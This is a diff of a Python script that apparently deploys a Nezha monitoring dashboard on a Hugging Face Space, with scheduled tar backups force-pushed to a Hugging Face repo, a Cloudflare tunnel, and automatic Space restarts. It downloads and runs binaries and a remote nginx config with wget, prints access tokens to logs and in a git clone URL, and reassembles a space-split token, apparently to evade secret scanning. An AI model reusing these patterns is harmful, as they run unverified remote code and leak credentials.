+        import pytz
+        from datetime import datetime
+        
+        # 设置中国时区
+        china_tz = pytz.timezone('Asia/Shanghai')
+        
+        # 获取当前中国时间的时间戳
+        timestamp = str(int(datetime.now(china_tz).timestamp() * 1000))
+        output_path = os.path.join(output_dir, f'{timestamp}.tar.gz')
+        
+        # 获取已存在的压缩包
+        existing_archives = glob.glob(os.path.join(output_dir, '*.tar.gz'))
+        
+        # 安全地提取时间戳
+        def extract_timestamp(filename):
+            # 提取文件名中的数字部分
+            match = re.search(r'(\d+)\.tar\.gz$', filename)
+            return int(match.group(1)) if match else 0
+        
+        # 如果压缩包数量超过5个，删除最旧的
+        if len(existing_archives) >= 5:
+            # 按时间戳排序
+            existing_archives.sort(key=extract_timestamp)
+            
+            # 删除最旧的压缩包
+            oldest_archive = existing_archives[0]
+            os.remove(oldest_archive)
+            print(f"删除最旧的压缩包：{oldest_archive}")
+        
+        # tar.gz 压缩
+        result = subprocess.run(
+            ['tar', '-czvf', output_path, folder_path], 
+            capture_output=True, 
+            text=True
+        )
+        
+        if result.returncode == 0:
+            # 计算压缩包大小
+            file_size = os.path.getsize(output_path) / 1024 / 1024
+            
+            # 格式化中国时区的时间
+            china_time = datetime.now(china_tz)
+            formatted_time = china_time.strftime('%Y-%m-%d %H:%M:%S')
+            
+            print(f"压缩成功：{output_path}")
+            print(f"压缩大小：{file_size:.2f} MB")
+            print(f"压缩时间：{formatted_time}")
+            
+            # 返回压缩包名和大小信息
+            return f"{os.path.basename(output_path)} MB：{file_size:.2f} MB TIME：{formatted_time}"
+        else:
+            print("压缩失败")
+            print("错误信息:", result.stderr)
+            return None
+    
+    except Exception as e:
+        print(f"压缩出错: {e}")
+        return None
+
+
+# 调用函数
+# new_archive = compress_folder('/data/dv1', 'nezha-hf')
+def github(type):
+    if type == 1:
+        os.system(f'rm -rf /data/{HF_REPO}') 
+    if not os.path.exists(f'/data/{HF_REPO}'):
+        git = f"git clone https://{HF_USER1}:{HF_TOKEN1}@huggingface.co/{HF_USER1}/{HF_REPO}"
+        print(git)
+        os.system(git)
+        os.system(f'git config --global user.email "{HF_EMAIL}"')
+        os.system(f'git config --global user.name "{HF_USER1}"') 
+    os.chdir(f'/data/{HF_REPO}')
+    if type == 2:
+        print("开始备份上传HF")
+        # 备份上传仓库
+        new_archive_info = compress_folder('/data/dv1', f'/data/{HF_REPO}')
+        if new_archive_info:
+            new_archive, file_size_info = new_archive_info.split(' MB：')
+            os.system(f'git add .')
+            os.system(f'git commit -m "{file_size_info}"')
+            # os.system('git push -u origin main')
+            os.system('git push -f origin main')
+        else:
+            print("压缩失败，无法提交")
+def nginx():    
+    # 确保目录存在
+    os.makedirs('/data/nginx1.24', exist_ok=True)
+    # 写入文件
+    with open('/data/nginx1.24/mime.types', 'w') as f:
+        f.write(mime_types_content)
+    # 设置文件权限（可选）
+    os.chmod('/data/nginx1.24/mime.types', 0o644)
+    print("mime.types 文件已创建")
+    # time.sleep(10)
+    os.system("rm -rf /data/nginx.conf")
+    os.system("wget -O '/data/nginx.conf' -q 'https://raw.githubusercontent.com/qilan28/hf-nezha/refs/heads/main/nginx.conf'")
+    os.system("/data/nginx1.24/sbin/nginx -c /data/nginx.conf")
+def dv1():
+    os.system("rm -rf /data/dv1.zip /data/dashboard-linux-amd64 /data/dv1 /data/data")
+    latest_package = get_latest_local_package(f'/data/{HF_REPO}')
+    if latest_package:
+        print(f"最新压缩包路径: {latest_package}")
+        print("通过备份包启动")
+        # tar -xzvf /data/nezha-hf/1759393184994.tar.gz -C /data
+        # tar -xzvf /data/nezha-hf/1759393184994.tar.gz --strip-components=2 -C /data dv1/
+        print(f"解压：tar -xzvf {latest_package} -C /data")
+        os.system(f"tar -xzvf {latest_package} -C /data")
+        
+        os.system("mv /data/data/dv1/ /data")
+        os.system("rm -rf /data/data")
+        os.chdir('/data/dv1')
+    else:
+        print("通过下载程序启动")
+        if not os.path.exists('/data/dv1'):
+            os.makedirs('/data/dv1')
+        if not os.path.exists('/data/dv1/data'):
+            os.system("rm -rf /data/dv1/data/config.yaml  /data/dv1/data/sqlite.db")
+            os.makedirs('/data/dv1/data')
+            with open('/data/dv1/data/config.yaml', 'w') as file:
+                yaml.dump(dashboard_config, file, default_flow_style=False)
+            print("配置文件已写入 /data/dv1/data/config.yaml")
+            print("下载'https://github.com/qilan28/hf-nezha/raw/refs/heads/main/sqlite.db'")
+            os.system("wget -O '/data/dv1/data/sqlite.db'  'https://github.com/qilan28/hf-nezha/raw/refs/heads/main/sqlite.db'")
+        os.chdir('/data/dv1')
+        print(f"下载'https://github.com/nezhahq/nezha/releases/download/{DASHBOARD_VERSION}/dashboard-linux-amd64.zip'")
+        os.system(f"wget -O '/data/dv1/dv1.zip' -q 'https://github.com/nezhahq/nezha/releases/download/{DASHBOARD_VERSION}/dashboard-linux-amd64.zip'")
+        os.system("unzip -o /data/dv1/dv1.zip -d /data/dv1")
+        os.system("rm -rf /data/dv1/dv1.zip")
+        os.system("chmod +x /data/dv1/dashboard-linux-amd64")
+        os.system("mv /data/dv1/dashboard-linux-amd64 /data/dv1/dv1")
+    if os.path.exists('/data/dv1/dv1') and os.path.isfile('/data/dv1/dv1'):
+        print("dv1存在开始启动")
+        threading.Thread(target=repeat_task, daemon=True).start()
+        threading.Thread(target=nginx, daemon=True).start()
+        threading.Thread(target=cloudflared, daemon=True).start()
+        threading.Thread(target=nv1_agent, daemon=True).start()
+        threading.Thread(target=check_system_resources, daemon=True).start()
+        # os.system('/data/dv1/dv1 jwt_timeout 48')
+        os.system('nohup /data/dv1/dv1 >> /dev/null 2>&1 &')
+    else:
+        print("dv1不存在")
+        
+def nv1_agent():
+    # time.sleep(10)
+    os.system("rm -rf /data/nv1.zip /data/nezha-agent /data/nv1")
+    print(f"下载'https://github.com/nezhahq/agent/releases/download/{NZV1_VERSION}/nezha-agent_linux_amd64.zip'")
+    os.system(f"wget -O '/data/nv1.zip' -q 'https://github.com/nezhahq/agent/releases/download/{NZV1_VERSION}/nezha-agent_linux_amd64.zip'")
+    time.sleep(2)
+    os.system("unzip -o /data/nv1.zip -d /data")
+    os.system("chmod +x  /data/nezha-agent")
+    os.makedirs('/data', exist_ok=True)
+    # 写入 YAML 文件
+    with open('/data/config.yml', 'w') as file:
+        yaml.dump(agent_config, file, default_flow_style=False)
+    print("配置文件已写入 /data/config.yml")
+    time.sleep(2)
+    os.system("rm -rf /data/nv1.zip")
+    os.system("mv /data/nezha-agent /data/nv1")
+    os.system("nohup /data/nv1 -c /data/config.yml >> /dev/null 2>&1 &")
+    
+def cloudflared():
+    os.system("rm -rf /data/cf")
+    os.system("wget -O '/data/cf' -q  'https://github.com/cloudflare/cloudflared/releases/download/2025.9.0/cloudflared-linux-amd64'")
+    os.system("chmod +x  /data/cf")
+    os.system(f'nohup /data/cf tunnel run --protocol http2 --token {ARGO_AUTH} >> /dev/null 2>&1 &')
+def _reconstruct_token(partial_token):
+    return partial_token.replace(" ", "")
+def restart_huggingface_space(space_name, space_id, partial_token):
+    token = _reconstruct_token(partial_token)
+    url = f"https://huggingface.co/api/spaces/{space_name}/{space_id}/restart?factory=true"
+    headers = {
+        "Content-Type": "application/json",
+        "Authorization": f"Bearer {token}",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36"
+    }
+    try:
+        response = requests.post(url, headers=headers, json={})
+        return {
+            "status_code": response.status_code,
+            "success": response.status_code == 200,
+            "message": response.text
+        }
+    except requests.RequestException as e:
+        return {
+            "status_code": None,
+            "success": False,
+            "message": str(e)
+        }
+def check_system_resources():
+    time.sleep(120)
+    cpu_usage = psutil.cpu_percent(interval=1)
+    memory = psutil.virtual_memory()
+    memory_usage = memory.percent
+    # if cpu_usage >= 90:
+    if cpu_usage >= 90 or memory_usage >= 95:
+        print("占用过高")
+        print(HF_USER2, HF_ID, HF_TOKEN2)
+        result = restart_huggingface_space(HF_USER2, HF_ID, HF_TOKEN2)
+        print(result)
+    else:
+        print("系统资源正常")
+   
+def repeat_task():
+    print('备份线程启动')
+    while True:
+        print(f"打包时间：{BACKUP_TIME} 秒")
+        time.sleep(int(BACKUP_TIME))# 2小时
+        github(2)
+github(1)
+os.chdir('/data/')
+dv1()
+if os.path.exists('/data/dv1/dv1') and os.path.isfile('/data/dv1/dv1'):
+    while True:
+        time.sleep(14400)# 4小时 14400 6小时 21600
+        github(2)
+        print(HF_USER2, HF_ID, HF_TOKEN2)
+        result = restart_huggingface_space(HF_USER2, HF_ID, HF_TOKEN2)
+        print(result)
+        # break
+github(2)
+# nv1_agent()
